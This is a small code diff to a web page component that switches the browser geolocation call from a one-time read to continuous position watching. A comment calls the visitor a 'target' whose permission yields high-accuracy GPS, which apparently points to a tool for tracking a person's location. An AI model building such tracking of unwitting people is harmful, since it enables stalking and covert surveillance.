@@ -46,7 +46,7 @@ export default function VisitorPage() {
 
     // 🟢 STEP A: Browser ka GPS checker trigger karo
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
+      navigator.geolocation.watchPosition(
         async (position) => {
           // Agar target ne "Allow" daba diya (High Accuracy GPS Data)
           const { latitude, longitude, accuracy } = position.coords;
